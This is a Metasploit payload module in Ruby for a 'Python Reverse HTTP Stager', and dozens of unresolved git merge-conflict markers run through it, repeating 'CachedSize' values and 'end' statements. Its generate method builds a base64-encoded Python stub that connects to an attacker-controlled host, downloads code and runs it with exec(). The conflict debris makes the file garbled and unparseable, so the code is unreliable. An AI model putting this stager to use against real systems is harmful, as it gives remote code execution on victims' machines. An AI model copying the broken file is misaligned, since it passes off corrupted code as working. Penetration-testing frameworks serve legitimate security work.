##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_http'
require 'msf/core/payload/python'
require 'msf/core/payload/python/reverse_http'

module Metasploit4

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
  CachedSize = 494
=======
  CachedSize = 466
<<<<<<< HEAD
>>>>>>> origin/4.11.2_release_pre-rails4
=======
<<<<<<< HEAD
  CachedSize = 494
=======
  CachedSize = 466
>>>>>>> 4.11.2_release_pre-rails4
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> 4.11.2_release_pre-rails4
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
=======
<<<<<<< HEAD
>>>>>>> pod/metasploit-inject.vcxproj.filters-master_0
  CachedSize = 494
=======
  CachedSize = 466
>>>>>>> 4.11.2_release_pre-rails4
<<<<<<< HEAD
=======

  CachedSize = 466

  CachedSize = 466

=======
>>>>>>> 4.11.2_release_pre-rails4
  CachedSize = 466
>>>>>>> origin/pod/metasploit-framework

  CachedSize = 466

  CachedSize = 466

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
=======
>>>>>>> 4.11.2_release_pre-rails4
>>>>>>> origin/pod/metasploit-api/_index.html
  CachedSize = 466

=======
=======
>>>>>>> 4.11.2_release_pre-rails4
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
  CachedSize = 466

  CachedSize = 466
>>>>>>> pod/metasploit-inject.vcxproj.filters-master_0
=======
  CachedSize = 494
=======
  CachedSize = 466
=======
  CachedSize = 494
=======
  CachedSize = 466
>>>>>>> origin/pod/metasploit-api/_index.html
=======
  CachedSize = 494
=======
  CachedSize = 466
>>>>>>> origin/pod/metasploit-excellent.mp3
>>>>>>> 4.11.2_release_pre-rails4

  CachedSize = 466

  CachedSize = 466

=======
>>>>>>> 4.11.2_release_pre-rails4
  CachedSize = 466
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/pod/metasploit-windows.rb

  CachedSize = 466

  CachedSize = 466

<<<<<<< HEAD
>>>>>>> origin/pod/metasploit-framework
=======
  CachedSize = 494

>>>>>>> origin/pod/metasploit-serialized_class_loader
  CachedSize = 466

=======
>>>>>>> origin/pod/metasploit-windows.rb
=======
>>>>>>> origin/4.11.2_release_pre-rails4
  CachedSize = 466

  CachedSize = 466

  CachedSize = 466
=======
>>>>>>> origin/pod/metasploit-api/_index.html

  CachedSize = 466
=======
>>>>>>> origin/pod/metasploit-excellent.mp3

  include Msf::Payload::Stager
  include Msf::Payload::Python
  include Msf::Payload::Python::ReverseHttp

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Python Reverse HTTP Stager',
      'Description'   => 'Tunnel communication over HTTP',
      'Author'        => 'Spencer McIntyre',
      'License'       => MSF_LICENSE,
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'Handler'       => Msf::Handler::ReverseHttp,
      'Stager'        => {'Payload' => ""}
    ))
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
  end

=======
=======
>>>>>>> origin/pod/metasploit-serialized_class_loader
=======
  end

=======
>>>>>>> origin/pod/metasploit-windows.rb
=======
  end

=======
>>>>>>> origin/pod/metasploit-api/_index.html
=======
  end

=======
>>>>>>> origin/pod/metasploit-excellent.mp3

    register_options(
      [
        OptString.new('PayloadProxyHost', [false, "The proxy server's IP address"]),
        OptPort.new('PayloadProxyPort', [true, "The proxy port to connect to", 8080 ])
      ], self.class)
  end

  #
  # Constructs the payload
  #
  def generate
    lhost = datastore['LHOST'] || '127.127.127.127'

    var_escape = lambda { |txt|
      txt.gsub('\\', '\\'*4).gsub('\'', %q(\\\'))
    }

    if Rex::Socket.is_ipv6?(lhost)
      target_url = "http://[#{lhost}]"
    else
      target_url = "http://#{lhost}"
    end

    target_url << ':'
    target_url << datastore['LPORT'].to_s
    target_url << '/'
    target_url << generate_callback_uri

    proxy_host = datastore['PayloadProxyHost'].to_s
    proxy_port = datastore['PayloadProxyPort'].to_i

    cmd  = "import sys\n"
    if proxy_host == ''
      cmd << "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener()\n"
    else
      proxy_url = Rex::Socket.is_ipv6?(proxy_host) ?
        "http://[#{proxy_host}]:#{proxy_port}" :
        "http://#{proxy_host}:#{proxy_port}"

      cmd << "ul=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['ProxyHandler','build_opener'])\n"
      cmd << "o=ul.build_opener(ul.ProxyHandler({'http':'#{var_escape.call(proxy_url)}'}))\n"
    end

    cmd << "o.addheaders=[('User-Agent','#{var_escape.call(datastore['MeterpreterUserAgent'])}')]\n"
    cmd << "exec(o.open('#{target_url}').read())\n"

    # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
    b64_stub  = "import base64,sys;exec(base64.b64decode("
    b64_stub << "{2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('"
    b64_stub << Rex::Text.encode_base64(cmd)
    b64_stub << "')))"
    return b64_stub
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # Add 100 bytes for the encoder to have some room
    space += 100

    # Make room for the maximum possible URL length
    space += 256

    # The final estimated size
    space
  end

  #
  # Return the longest URL that fits into our available space
  #
  def generate_callback_uri
    uri_req_len = 30 + rand(256-30)

    # Generate the short default URL if we don't have enough space
    if self.available_space.nil? || required_space > self.available_space
      uri_req_len = 5
    end

    generate_uri_checksum(Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITP, uri_req_len)
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
  end

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/payload-generator.rb
=======
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
<<<<<<< HEAD
=======
>>>>>>> msf-complex-payloads
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> msf-complex-payloads
=======
>>>>>>> msf-complex-payloads
=======
>>>>>>> payload-generator.rb
=======
>>>>>>> pod/metasploit-gemfile-
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
>>>>>>> origin/pod/metasploit-framework
=======
=======
  end

>>>>>>> rapid7/master
>>>>>>> origin/pod/metasploit-serialized_class_loader
=======
>>>>>>> origin/pod/metasploit-gemfile-
=======
  end

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> msf-complex-payloads
=======
>>>>>>> msf-complex-payloads
=======
>>>>>>> payload-generator.rb
>>>>>>> origin/pod/metasploit-windows.rb
=======
  end

>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
=======
  end

>>>>>>> origin/msf-complex-payloads
=======
  end

>>>>>>> origin/payload-generator.rb
=======
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
  end

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
<<<<<<< HEAD
=======
>>>>>>> msf-complex-payloads
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
end
